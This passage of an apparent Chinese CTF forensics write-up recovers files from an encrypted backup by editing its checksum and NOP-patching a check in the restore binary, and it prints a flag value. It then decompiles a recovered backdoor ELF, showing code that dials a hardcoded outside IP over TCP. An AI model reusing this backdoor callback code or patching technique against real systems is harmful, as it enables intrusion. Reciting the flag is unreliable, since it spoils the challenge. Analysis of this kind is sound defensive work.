<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">stored_md5_sum = EACDD8510B0F54EA412FA900A2F0645F</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">calculated_md5_sum = 85077064C3EB25BDE2EAD27EE50A959C</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>直接对 <code>cbak</code> 文件的校验值进行修改，然后尝试执行</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~/tmp/2024sxb-1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ hexdump 202410311935.patch.cbak -C | head -n 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000000  43 42 41 4b 85 07 70 64  c3 eb 25 bd e2 ea d2 7e  |CBAK..pd..%....~|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000010  e5 0a 95 9c 33 2e 38 35  2e 34 68 36 62 61 63 6b  |....3.85.4h6back|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">00000020  75 70 2e 6c 6f 67 00 00  00 00 00 00 00 00 00 00  |up.log..........|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">┌──(randark ㉿ kali)-[~/tmp/2024sxb-1]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─$ ./myback</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Menu:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1. Backup File</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. Restore Files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3. Print Info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4. Exit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enter your choice: 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Please enter the backup file name to be restored:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">202410311935.patch.cbak</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这一次没有报错信息，并得到了以下文件</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 randark randark 2.9K Nov  9 22:20 jz_orders.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 randark randark  36K Nov  9 22:20 jzcms.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 randark randark 1.6K Nov  9 22:20 jzcms2.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 randark randark 2.0K Nov  9 22:20 jzcms3.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 randark randark 1.9K Nov  9 22:20 jzcms4.sql</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-rw-rw-r-- 1 randark randark 3.0K Nov  9 22:20 jzsms1.sql</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>但是很明显，这里面并没有所想要的带有源码的压缩文件</p>
<p>在 <code>restore_files()</code> 函数的 <code>if ( info_0-&gt;filename[0] != 46 )</code> 部分下断点，查看执行过程</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241126-222604-829192e3cf99907de7bf9046a7bb6be6.png" width="1247" height="629" class="img_ev3q"></p>
<p>继续 Step Into 查看</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241126-222620-2db5d217ff371be64792ff5472591cd7.png" width="1231" height="511" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241126-222632-510786afb2a8b0160d566161a88025f0.png" width="1208" height="534" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241126-222644-6204952a48793d43bf241926ed8b827c.png" width="1292" height="560" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241126-222658-95cc762dafa9fd176f17a0352af0276b.png" width="1275" height="556" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241127-222713-0e8e6936e44e11d952ad5f04c6238702.png" width="1284" height="595" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241127-222725-cc64b37977b34f00f757eff7a81af6b1.png" width="1411" height="749" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241127-222739-ef481fc0d3626a575e880229e4b23364.png" width="1214" height="560" class="img_ev3q"></p>
<p>同时，在调试中，发现 <code>file_info_count</code> 变量的值为 <code>8</code> 与所得到的 8 个文件的信息相吻合</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241128-222827-c738e0756e6e04bece8483699b824e77.png" width="1259" height="611" class="img_ev3q"></p>
<p>有两种办法：</p>
<ol>
<li>基于反编译结果，解析出备份文件的结构体信息，基于结构体信息自动化还原出所有文件</li>
<li>直接基于 offset 信息，将文件手动一个一个还原出来</li>
<li>在动调中直接获取各个文件解密后的结果</li>
</ol>
<p>第一个方案很明显比赛时时间来不及，那就只看二、三方案</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="基于-offset-手动处理">基于 offset 手动处理<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024sxb%20Scenario-Race%20Data-Backup#%E5%9F%BA%E4%BA%8E-offset-%E6%89%8B%E5%8A%A8%E5%A4%84%E7%90%86" class="hash-link" aria-label="基于 offset 手动处理的直接链接" title="基于 offset 手动处理的直接链接">​</a></h3>
<p>首先，很明显两个文件的 filename 为 <code>...</code> 值，很明显无法储存为正常的文件，于是提取两个文件的信息</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">file_size = 0x2795B2(2594226) file_offset = 0x1E73(7795)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">file_size = 0x29BD01(2735361) file_offset = 0x284B4D(2640717)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后直接 Cyberchef 处理</p>
<p>查看第一个文件</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241140-224017-dbcb193eb6e782f20e59ed6737820772.png" width="2559" height="1371" class="img_ev3q"></p>
<p>很明显的 zip 压缩包文件，这里其实可以直接得到答案</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241141-224102-2e31f0885c6681cb8906eb4eaf4fa982.png" width="2559" height="1371" class="img_ev3q"></p>
<p>第二个文件</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241141-224149-624d93b124555bc3295c153d9572a7e6.png" width="2559" height="1371" class="img_ev3q"></p>
<p>很明显是 ELF 二进制文件</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="基于动调拿到文件数据">基于动调拿到文件数据<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024sxb%20Scenario-Race%20Data-Backup#%E5%9F%BA%E4%BA%8E%E5%8A%A8%E8%B0%83%E6%8B%BF%E5%88%B0%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE" class="hash-link" aria-label="基于动调拿到文件数据的直接链接" title="基于动调拿到文件数据的直接链接">​</a></h3>
<p>在 <code>restore_files()</code> 函数的 <code>output_file = fopen(info_0-&gt;filename, "wb");</code> 部分下断点，查看执行过程</p>
<p>由于存在</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241147-224743-1a7ee576f2331655828d10e7293aaf21.png" width="1669" height="733" class="img_ev3q"></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">info_0</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>所以在没有恢复文件名信息之前，无法直接通过动调拿到文件数据</p>
<p>有一个办法，就是将文件名 check 部分的逻辑进行 patch</p>
<p>定位到</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241104-230419-fa23df613f6d8c74b13f19d4d1e425bd.png" width="1862" height="1009" class="img_ev3q"></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">info_0</span><span class="token operator" style="color:#393A34">-&gt;</span><span class="token plain">filename</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">46</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这部分查看汇编</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241105-230540-64b78816c783a894f51fd2261f57374a.png" width="1784" height="924" class="img_ev3q"></p>
<div class="language-asm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-asm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000254B loc_254B:                               ; CODE XREF: restore_files+689↓j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000254B                 mov     eax, [rbp+i]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002551                 movsxd  rdx, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002554                 mov     rax, rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002557                 shl     rax, 3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000255B                 add     rax, rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000255E                 shl     rax, 2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002562                 mov     rdx, rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002565                 mov     rax, [rbp+file_info_list]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000256C                 add     rax, rdx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000256F                 mov     [rbp+info_0], rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002576                 mov     rax, [rbp+info_0]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000257D                 movzx   eax, byte ptr [rax]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002580                 cmp     al, 2Eh ; '.'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002582                 jz      loc_2724</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002588                 mov     rax, [rbp+info_0]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000258F                 mov     edx, [rax+20h]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002592                 mov     rax, [rbp+info_0]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:0000000000002599                 mov     eax, [rax+1Ch]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000259C                 add     eax, edx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:000000000000259E                 cdqe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00000000000025A0                 cmp     [rbp+backup_file_size], rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00000000000025A7                 jge     short loc_25CC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00000000000025A9                 mov     rax, [rbp+info_0]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00000000000025B0                 mov     rsi, rax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00000000000025B3                 lea     rax, byte_42C0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00000000000025BA                 mov     rdi, rax        ; format</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00000000000025BD                 mov     eax, 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00000000000025C2                 call    _printf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.text:00000000000025C7                 jmp     loc_2725</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>在 <code>cmp     al, 2Eh ; '.'</code> 处执行 <code>NOP</code> 进行无效化</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241106-230625-790075b2d9faf4dccdce36300d7eeaa5.png" width="1865" height="952" class="img_ev3q"></p>
<p>查看反汇编，可以看到逻辑已经被修改</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241106-230659-f5065a2711beb607d91e61e16f310215.png" width="1944" height="1047" class="img_ev3q"></p>
<p>执行完 patch 操作之后，菜单 <code>Edit</code> -&gt; <code>Patch program</code> -&gt; <code>Apply patches to</code> 将 patch 后的二进制文件导出为 <code>myback.patch</code></p>
<p>对 patch 后的 <code>myback.patch</code> 程序继续动调，断点下在文件处理部分，即可看到</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241111-231121-357ed6d56fb623e9e7e402bfba902fbb.png" width="1376" height="748" class="img_ev3q"></p>
<p>查看 <code>decrypted_data</code> 指针所指的内存区域</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241111-231153-5c4dff6cfdf7cbb7742f483f90448c26.png" width="1525" height="1241" class="img_ev3q"></p>
<p>成功基于动调获取到文件内容</p>
<div class="language-flag codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-flag codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">d64fb691c47bbadbfa4495732cb6d3ae</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="5-分析后门文件的连接地址">5. 分析后门文件的连接地址<a href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/blog/2024sxb%20Scenario-Race%20Data-Backup#5-%E5%88%86%E6%9E%90%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E7%9A%84%E8%BF%9E%E6%8E%A5%E5%9C%B0%E5%9D%80" class="hash-link" aria-label="5. 分析后门文件的连接地址的直接链接" title="5. 分析后门文件的连接地址的直接链接">​</a></h2>
<blockquote>
<p>备份文件经过修复后将所有文件成功地恢复了，但是发现有一个未知的文件，经过简单分析后，确认是攻击者留下的后门程序，请选手分析备份恢复系统中的后门程序，确定后门程序连接服务的地址 / 域名和端口。</p>
<p>【答案标准】例：若分析得到的后门服务的的 IP 的为 127.0.0.1 或者分析得到服务的的域名为 mst.com，对应的连接端口为 1234，则提交的 案为：IP 127.0.0.1:1234 或者域名 mst.com:1234。</p>
</blockquote>
<p>这里的未知文件，就是上一题中找到的 elf 二进制文件</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241113-231354-a24aaf4b8f0996cd14e200bf8869e0d2.png" width="1084" height="797" class="img_ev3q"></p>
<p>对其进行逆向分析，定位到 <code>main_main()</code> 函数</p>
<p><img decoding="async" loading="lazy" alt="img" src="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/assets/images/image_20241116-231633-e1aff744cca401b5ba681327c8e405fc.png" width="2560" height="1540" class="img_ev3q"></p>
<p>基本上是一个网络通信的二进制程序，按照顺序重复尝试了多个服务器，将基本逻辑块提取一个出来</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">v35</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3LL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><span class="token string" style="color:#e3116c">"221.67.213.4"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">cap </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">12LL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v21</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">str </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">uint8 </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">sep</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v21</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">len </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1LL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v35</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">str </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">uint8 </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token string" style="color:#e3116c">"tcp"</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v24 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">io_Writer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">runtime_concatstring4</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0LL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> v35</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">string </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v31</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">len</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> v21</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> v2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v24</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">tab </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">runtime_itab </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token function" style="color:#d73a49">runtime_convTstring</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">string</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">v24</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v17 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">RTYPE_string_0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_QWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">v17 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" 